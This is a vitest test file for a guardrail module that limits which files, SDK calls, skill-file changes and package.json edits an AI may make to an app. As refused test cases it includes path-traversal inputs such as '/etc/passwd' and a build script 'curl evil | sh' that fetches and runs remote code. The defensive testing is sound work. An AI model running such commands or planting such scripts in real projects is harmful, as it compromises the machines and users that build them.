import { describe, expect, it } from 'vitest';
import type { Skill } from '@entoli/sdk/skill';
import { allowedFiles, checkCode, checkFile, checkPackageJson, checkSkillChange, checkSubmission, normalizePath } from '@/lib/guardrails';
import raw from '../../../examples/notes-app/entoli.skill.json';

const skill = raw as unknown as Skill;
const sources = {
  'note.create': [{ file: 'src/App.tsx' }],
  'settings.email': [{ file: 'src/App.tsx' }],
  'settings.theme': [{ file: 'src/pages/Settings.tsx' }],
};
const reasons = (v: { ok: boolean } & Record<string, unknown>) => (v.ok ? [] : (v.reasons as string[]));
const off = (name: string): Skill => ({ ...skill, acts: skill.acts.map((a) => (a.name === name ? { ...a, layer: 'off' as const } : a)) });

describe('rule 1: files', () => {
  it('normalizes paths and refuses anything that escapes', () => {
    expect(normalizePath('./src//App.tsx')).toBe('src/App.tsx');
    for (const bad of ['../x', 'src/../../x', '/etc/passwd', 'a\\b', '', '.', 'x\0y']) expect(normalizePath(bad), bad).toBeNull();
  });

  it('allows the source files of exposed acts, the entry, the skill, package.json and bootstrap files only', () => {
    const allowed = allowedFiles(skill, sources);
    expect(allowed).toEqual(expect.arrayContaining(['src/App.tsx', 'src/pages/Settings.tsx', 'entoli.skill.json', 'package.json', 'src/entoli.ts', 'src/main.tsx', 'app/layout.tsx']));
    for (const bad of ['.env', '.github/workflows/deploy.yml', 'src/payments/charge.ts', 'node_modules/x/index.js', 'next.config.js']) {
      expect(checkFile(bad, allowed).ok, bad).toBe(false);
    }
    expect(checkFile('./src/App.tsx', allowed)).toMatchObject({ ok: true, path: 'src/App.tsx' });
  });

  it('an "off" act\'s files are not opened up by it', () => {
    const only = allowedFiles(off('settings.theme'), sources);
    expect(only).not.toContain('src/pages/Settings.tsx');
    expect(only).toContain('src/App.tsx');
  });

  it('monorepos: package.json and entry files in each ancestor directory of the sources', () => {
    const a = allowedFiles(skill, { 'note.create': [{ file: 'apps/web/src/App.tsx' }] });
    expect(a).toEqual(expect.arrayContaining(['apps/web/package.json', 'apps/web/src/main.tsx', 'apps/web/entoli.skill.json', 'package.json']));
  });
});

describe('rules 2 and 3: acts and contract in code', () => {
  const wire = (call: string) => `import { useEntoli } from '@entoli/sdk/react';\nexport function App() {\n  ${call}\n  return null;\n}\n`;

  it('accepts a correct wiring', () => {
    expect(checkCode('src/App.tsx', wire("useEntoli('note.create', { text: 'freeText' }, ({ text }) => add(text), { undo: (n) => remove(n) });"), skill).ok).toBe(true);
    expect(checkCode('src/App.tsx', wire("useEntoli('settings.email', { email: 'freeText' }, change, { radius: 'external', exact: true, voiceOnly: true });"), skill).ok).toBe(true);
  });

  it('refuses invented acts, off acts and non-literal names', () => {
    expect(reasons(checkCode('src/App.tsx', wire("useEntoli('account.delete', {}, del);"), skill))[0]).toMatch(/not an act in the skill/);
    expect(reasons(checkCode('src/App.tsx', wire("useEntoli('settings.email', {}, change);"), off('settings.email')))[0]).toMatch(/"off"/);
    expect(reasons(checkCode('src/App.tsx', wire("useEntoli(name, {}, change);"), skill))[0]).toMatch(/string literal/);
  });

  it('refuses a weaker contract than the skill', () => {
    const r = (call: string, s = skill) => reasons(checkCode('src/App.tsx', wire(call), s)).join(' | ');
    expect(r("useEntoli('settings.email', {}, change, { radius: 'self' });")).toMatch(/weaker than the skill's "external"/);
    expect(r("useEntoli('settings.email', {}, change, { exact: false });")).toMatch(/turns exact off/);
    expect(r("useEntoli('settings.email', {}, change, { voiceOnly: false });")).toMatch(/turns voiceOnly off/);
    expect(r("useEntoli('settings.email', {}, change, { undo: () => {} });")).toMatch(/no undo in the skill/);
    expect(r("useEntoli('settings.theme', {}, set, { kind: 'feature' });")).toMatch(/must stay one/);
  });

  it('refuses options it cannot check (variables, spreads, computed keys)', () => {
    const r = (call: string) => reasons(checkCode('src/App.tsx', wire(call), skill)).join(' | ');
    expect(r("useEntoli('note.create', {}, add, opts);")).toMatch(/object literal/);
    expect(r("useEntoli('note.create', {}, add, { ...base });")).toMatch(/spreads/);
    expect(r("useEntoli('note.create', {}, add, { [k]: 1 });")).toMatch(/computed/);
    expect(r("useEntoli('settings.email', {}, change, { radius });")).toMatch(/literal/);
  });

  it('also checks defineAct and entoli.register', () => {
    expect(checkCode('a.js', "defineAct('ghost', {}, f);", skill).ok).toBe(false);
    expect(checkCode('a.js', "entoli.register('ghost', {}, f);", skill).ok).toBe(false);
    expect(checkCode('a.js', "other.register('ghost', {}, f);", skill).ok).toBe(true); // not ours
  });

  it('leaves non-code files alone', () => {
    expect(checkCode('src/entoli.theme.css', '.entoli{}', skill).ok).toBe(true);
  });
});

describe('rule 3: the skill file may only tighten', () => {
  const edit = (f: (s: Skill) => void) => { const c = JSON.parse(JSON.stringify(skill)) as Skill; f(c); return JSON.stringify(c); };
  const act = (s: Skill, n: string) => s.acts.find((a) => a.name === n)!;

  it('accepts the same skill and tightenings', () => {
    expect(checkSkillChange(JSON.stringify(skill), skill).ok).toBe(true);
    expect(checkSkillChange(edit((s) => { act(s, 'note.create').layer = 'off'; act(s, 'note.search').radius = 'other-person'; delete act(s, 'note.tag').undo; s.knowledge.push({ topic: 'x', can: false, answer: 'No.' }); }), skill).ok).toBe(true);
  });

  it('refuses loosening, adding and removing', () => {
    const why = (f: (s: Skill) => void) => reasons(checkSkillChange(edit(f), skill)).join(' | ');
    expect(why((s) => { act(s, 'settings.email').radius = 'self'; })).toMatch(/weaker/);
    expect(why((s) => { act(s, 'settings.email').undo = true; })).toMatch(/undo was added/);
    expect(why((s) => { delete act(s, 'settings.email').exact; })).toMatch(/exact was removed/);
    expect(why((s) => { delete act(s, 'settings.email').voiceOnly; })).toMatch(/voiceOnly was removed/);
    expect(why((s) => { act(s, 'settings.theme').kind = 'feature'; })).toMatch(/no longer marked as a setting/);
    expect(why((s) => { s.acts.push({ name: 'account.delete', phrases: ['delete account'], radius: 'external' }); })).toMatch(/adds the act "account.delete"/);
    expect(why((s) => { s.acts = s.acts.filter((a) => a.name !== 'note.delete'); s.map = s.map.filter((n) => n.act !== 'note.delete'); })).toMatch(/removes the act "note.delete"/);
  });

  it('refuses giving the AI more reach', () => {
    const l1 = { ...skill, layer: 'L1' as const, acts: skill.acts.map((a) => ({ ...a })) };
    l1.acts.find((a) => a.name === 'note.create')!.layer = 'off';
    const moreReach = JSON.stringify({ ...l1, acts: l1.acts.map((a) => (a.name === 'note.create' ? { ...a, layer: 'L2' } : a)) });
    expect(reasons(checkSkillChange(moreReach, l1)).join()).toMatch(/gives the AI more reach/);
    const fromL1 = JSON.stringify({ ...l1, acts: l1.acts.map((a) => (a.name === 'note.search' ? { ...a, layer: 'L2' } : a)) });
    expect(reasons(checkSkillChange(fromL1, l1)).join()).toMatch(/more reach/);
  });

  it('refuses invalid JSON and invalid skills', () => {
    expect(reasons(checkSkillChange('{nope', skill))[0]).toMatch(/not valid JSON/);
    expect(reasons(checkSkillChange('{"entoli":"0.1"}', skill))[0]).toMatch(/entoli.skill.json:/);
  });
});

describe('rule 4: package.json may only gain @entoli/sdk', () => {
  const base = JSON.stringify({ name: 'x', scripts: { build: 'vite build' }, dependencies: { react: '^18.0.0' } }, null, 2);
  it('accepts adding the SDK, in any key order', () => {
    expect(checkPackageJson(base, JSON.stringify({ dependencies: { react: '^18.0.0', '@entoli/sdk': '^0.1.0' }, scripts: { build: 'vite build' }, name: 'x' })).ok).toBe(true);
  });
  it('refuses anything else', () => {
    const why = (next: object | string, b: string | null = base) => reasons(checkPackageJson(b, typeof next === 'string' ? next : JSON.stringify(next))).join(' | ');
    expect(why({ name: 'x', scripts: { build: 'curl evil | sh' }, dependencies: { react: '^18.0.0', '@entoli/sdk': '^0.1.0' } })).toMatch(/beyond adding/);
    expect(why({ name: 'x', scripts: { build: 'vite build' }, dependencies: { react: '^18.0.0', leftpad: '1.0.0', '@entoli/sdk': '^0.1.0' } })).toMatch(/beyond adding/);
    expect(why(JSON.parse(base))).toMatch(/does not add/);
    expect(why('{nope')).toMatch(/not valid JSON/);
    expect(why({}, null)).toMatch(/does not exist/);
  });
});

describe('checkSubmission', () => {
  it('routes each file type to its rule, and enforces size and syntax', () => {
    expect(checkSubmission({ path: 'src/App.tsx', content: 'export const a = 1;', base: null, skill }).ok).toBe(true);
    expect(reasons(checkSubmission({ path: 'src/App.tsx', content: 'const = ;', base: null, skill })).join()).toMatch(/does not parse/);
    expect(reasons(checkSubmission({ path: 'src/App.tsx', content: 'x'.repeat(200_001), base: null, skill }))[0]).toMatch(/over 200 kB/);
    expect(checkSubmission({ path: 'entoli.skill.json', content: JSON.stringify(skill), base: null, skill }).ok).toBe(true);
  });
});
